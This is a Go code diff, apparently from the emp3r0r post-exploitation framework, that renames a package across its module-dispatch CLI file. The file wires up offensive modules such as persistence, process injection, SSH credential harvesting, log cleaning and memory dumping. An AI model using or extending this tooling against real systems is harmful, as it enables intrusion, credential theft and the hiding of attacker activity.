@@ -9,7 +9,7 @@ import (
 	"strconv"
 	"strings"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/lithammer/fuzzysearch/fuzzy"
 )
@@ -29,7 +29,7 @@ var (
 	CurrentMod = "<blank>"
 
 	// CurrentTarget selected target
-	CurrentTarget *emp3r0r_data.Emp3r0rAgent
+	CurrentTarget *emp3r0r_def.Emp3r0rAgent
 
 	// Options currently available options for `set`
 	Options = make(map[string]*Option)
@@ -47,23 +47,23 @@ var (
 
 	// ModuleHelpers a map of module helpers
 	ModuleHelpers = map[string]func(){
-		emp3r0r_data.ModGenAgent:     modGenAgent,
-		emp3r0r_data.ModCMD_EXEC:     moduleCmd,
-		emp3r0r_data.ModSHELL:        moduleShell,
-		emp3r0r_data.ModPROXY:        moduleProxy,
-		emp3r0r_data.ModPORT_FWD:     modulePortFwd,
-		emp3r0r_data.ModLPE_SUGGEST:  moduleLPE,
-		emp3r0r_data.ModCLEAN_LOG:    moduleLogCleaner,
-		emp3r0r_data.ModPERSISTENCE:  modulePersistence,
-		emp3r0r_data.ModVACCINE:      moduleVaccine,
-		emp3r0r_data.ModINJECTOR:     moduleInjector,
-		emp3r0r_data.ModBring2CC:     moduleBring2CC,
-		emp3r0r_data.ModStager:       modStager,
-		emp3r0r_data.ModListener:     modListener,
-		emp3r0r_data.ModSSHHarvester: module_ssh_harvester,
-		emp3r0r_data.ModDownloader:   moduleDownloader,
-		emp3r0r_data.ModFileServer:   moduleFileServer,
-		emp3r0r_data.ModMemDump:      moduleMemDump,
+		emp3r0r_def.ModGenAgent:     modGenAgent,
+		emp3r0r_def.ModCMD_EXEC:     moduleCmd,
+		emp3r0r_def.ModSHELL:        moduleShell,
+		emp3r0r_def.ModPROXY:        moduleProxy,
+		emp3r0r_def.ModPORT_FWD:     modulePortFwd,
+		emp3r0r_def.ModLPE_SUGGEST:  moduleLPE,
+		emp3r0r_def.ModCLEAN_LOG:    moduleLogCleaner,
+		emp3r0r_def.ModPERSISTENCE:  modulePersistence,
+		emp3r0r_def.ModVACCINE:      moduleVaccine,
+		emp3r0r_def.ModINJECTOR:     moduleInjector,
+		emp3r0r_def.ModBring2CC:     moduleBring2CC,
+		emp3r0r_def.ModStager:       modStager,
+		emp3r0r_def.ModListener:     modListener,
+		emp3r0r_def.ModSSHHarvester: module_ssh_harvester,
+		emp3r0r_def.ModDownloader:   moduleDownloader,
+		emp3r0r_def.ModFileServer:   moduleFileServer,
+		emp3r0r_def.ModMemDump:      moduleMemDump,
 	}
 )
 
@@ -110,7 +110,7 @@ func UpdateOptions(modName string) (exist bool) {
 
 	var currentOpt *Option
 	switch modName {
-	case emp3r0r_data.ModCMD_EXEC:
+	case emp3r0r_def.ModCMD_EXEC:
 		currentOpt = addIfNotFound("cmd_to_exec")
 		currentOpt.Vals = []string{
 			"id", "whoami", "ifconfig",
@@ -119,7 +119,7 @@ func UpdateOptions(modName string) (exist bool) {
 			"netstat -antup", "uname -a",
 		}
 
-	case emp3r0r_data.ModSHELL:
+	case emp3r0r_def.ModSHELL:
 		shellOpt := addIfNotFound("shell")
 		shellOpt.Vals = []string{
 			"/bin/bash", "/bin/zsh", "/bin/sh", "python", "python3",
@@ -135,7 +135,7 @@ func UpdateOptions(modName string) (exist bool) {
 		}
 		portOpt.Val = RuntimeConfig.SSHDShellPort
 
-	case emp3r0r_data.ModPORT_FWD:
+	case emp3r0r_def.ModPORT_FWD:
 		// rport
 		portOpt := addIfNotFound("to")
 		portOpt.Vals = []string{"127.0.0.1:22", "127.0.0.1:8080"}
@@ -151,12 +151,12 @@ func UpdateOptions(modName string) (exist bool) {
 		protOpt.Vals = []string{"tcp", "udp"}
 		protOpt.Val = "tcp"
 
-	case emp3r0r_data.ModCLEAN_LOG:
+	case emp3r0r_def.ModCLEAN_LOG:
 		// keyword to clean
 		keywordOpt := addIfNotFound("keyword")
 		keywordOpt.Vals = []string{"root", "admin"}
 
-	case emp3r0r_data.ModPROXY:
+	case emp3r0r_def.ModPROXY:
 		portOpt := addIfNotFound("port")
 		portOpt.Vals = []string{"1080", "8080", "10800", "10888"}
 		portOpt.Val = "8080"
@@ -164,24 +164,24 @@ func UpdateOptions(modName string) (exist bool) {
 		statusOpt.Vals = []string{"on", "off", "reverse"}
 		statusOpt.Val = "on"
 
-	case emp3r0r_data.ModLPE_SUGGEST:
+	case emp3r0r_def.ModLPE_SUGGEST:
 		currentOpt = addIfNotFound("lpe_helper")
 		for name := range LPEHelperURLs {
 			currentOpt.Vals = append(currentOpt.Vals, name)
 		}
 		currentOpt.Val = "lpe_les"
 
-	case emp3r0r_data.ModINJECTOR:
+	case emp3r0r_def.ModINJECTOR:
 		pidOpt := addIfNotFound("pid")
 		pidOpt.Vals = []string{"0"}
 		pidOpt.Val = "0"
 		methodOpt := addIfNotFound("method")
-		for k := range emp3r0r_data.InjectorMethods {
+		for k := range emp3r0r_def.InjectorMethods {
 			methodOpt.Vals = append(methodOpt.Vals, k)
 		}
 		methodOpt.Val = "shared_library"
 
-	case emp3r0r_data.ModBring2CC:
+	case emp3r0r_def.ModBring2CC:
 		addrOpt := addIfNotFound("addr")
 		kcpOpt := addIfNotFound("kcp")
 		addrOpt.Vals = []string{"127.0.0.1"}
@@ -189,14 +189,14 @@ func UpdateOptions(modName string) (exist bool) {
 		kcpOpt.Vals = []string{"on", "off"}
 		kcpOpt.Val = "on"
 
-	case emp3r0r_data.ModPERSISTENCE:
+	case emp3r0r_def.ModPERSISTENCE:
 		currentOpt = addIfNotFound("method")
-		for k := range emp3r0r_data.PersistMethods {
+		for k := range emp3r0r_def.PersistMethods {
 			currentOpt.Vals = append(currentOpt.Vals, k)
 		}
 		currentOpt.Val = "profiles"
 
-	case emp3r0r_data.ModStager:
+	case emp3r0r_def.ModStager:
 		stager_type_opt := addIfNotFound("type")
 		stager_type_opt.Val = Stagers[0]
 		stager_type_opt.Vals = Stagers
@@ -216,7 +216,7 @@ func UpdateOptions(modName string) (exist bool) {
 		}
 		agentpath_type_opt.Vals = listing
 
-	case emp3r0r_data.ModGenAgent:
+	case emp3r0r_def.ModGenAgent:
 		// os
 		os := addIfNotFound("os")
 		os.Vals = []string{"linux", "windows", "dll"}
@@ -263,7 +263,7 @@ func UpdateOptions(modName string) (exist bool) {
 		auto_proxy.Vals = []string{"on", "off"}
 		auto_proxy.Val = "off"
 
-	case emp3r0r_data.ModListener:
+	case emp3r0r_def.ModListener:
 		listenerOpt := addIfNotFound("listener")
 		listenerOpt.Vals = []string{"http_aes_compressed", "http_bare"}
 		listenerOpt.Val = "http_aes_compressed"
@@ -277,18 +277,18 @@ func UpdateOptions(modName string) (exist bool) {
 		passphraseOpt := addIfNotFound("passphrase")
 		passphraseOpt.Val = "my_secret_key"
 
-	case emp3r0r_data.ModFileServer:
+	case emp3r0r_def.ModFileServer:
 		portOpt := addIfNotFound("port")
 		portOpt.Val = "8000"
 		switchOpt := addIfNotFound("switch")
 		switchOpt.Val = "on"
 
-	case emp3r0r_data.ModVACCINE:
+	case emp3r0r_def.ModVACCINE:
 		// download_addr
 		download_addr := addIfNotFound("download_addr")
 		download_addr.Val = ""
 
-	case emp3r0r_data.ModDownloader:
+	case emp3r0r_def.ModDownloader:
 		// download_addr
 		download_addr := addIfNotFound("download_addr")
 		download_addr.Val = ""
@@ -297,7 +297,7 @@ func UpdateOptions(modName string) (exist bool) {
 		checksum := addIfNotFound("checksum")
 		checksum.Val = ""
 
-	case emp3r0r_data.ModMemDump:
+	case emp3r0r_def.ModMemDump:
 		// dump all memory regions
 		pid := addIfNotFound("pid")
 		pid.Val = ""
@@ -319,7 +319,7 @@ func UpdateOptions(modName string) (exist bool) {
 
 // ModuleRun run current module
 func ModuleRun() {
-	modObj := emp3r0r_data.Modules[CurrentMod]
+	modObj := emp3r0r_def.Modules[CurrentMod]
 	if modObj == nil {
 		CliPrintError("ModuleRun: module %s not found", strconv.Quote(CurrentMod))
 		return
@@ -333,20 +333,20 @@ func ModuleRun() {
 		}
 	}
 
-	if CurrentMod == emp3r0r_data.ModCMD_EXEC {
+	if CurrentMod == emp3r0r_def.ModCMD_EXEC {
 		if !CliYesNo("Run on all targets") {
 			CliPrintError("Target not specified")
 			return
 		}
-		go ModuleHelpers[emp3r0r_data.ModCMD_EXEC]()
+		go ModuleHelpers[emp3r0r_def.ModCMD_EXEC]()
 		return
 	}
-	if CurrentMod == emp3r0r_data.ModGenAgent {
-		go ModuleHelpers[emp3r0r_data.ModGenAgent]()
+	if CurrentMod == emp3r0r_def.ModGenAgent {
+		go ModuleHelpers[emp3r0r_def.ModGenAgent]()
 		return
 	}
-	if CurrentMod == emp3r0r_data.ModStager {
-		go ModuleHelpers[emp3r0r_data.ModStager]()
+	if CurrentMod == emp3r0r_def.ModStager {
+		go ModuleHelpers[emp3r0r_def.ModStager]()
 		return
 	}
 	if CurrentTarget == nil {
@@ -367,7 +367,7 @@ func ModuleRun() {
 }
 
 // SelectCurrentTarget check if current target is set and alive
-func SelectCurrentTarget() (target *emp3r0r_data.Emp3r0rAgent) {
+func SelectCurrentTarget() (target *emp3r0r_def.Emp3r0rAgent) {
 	// find target
 	target = CurrentTarget
 	if target == nil {
